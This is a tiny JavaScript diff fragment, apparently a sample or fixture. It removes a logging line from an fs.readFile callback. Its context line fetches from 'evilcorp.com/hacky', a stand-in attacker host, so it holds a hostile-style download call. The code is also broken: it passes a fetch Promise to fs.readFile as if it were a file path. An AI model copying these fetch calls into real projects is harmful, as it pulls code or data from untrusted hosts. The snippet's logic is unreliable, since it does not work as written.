@@ -4,5 +4,4 @@ const files = [fetch('https://evilcorp.com/hacky'), fetch('https://evilcorp.com/
 
 fs.readFile(files[0], (err, data) => {
   if (err) throw err;
-  console.log(data);
 });
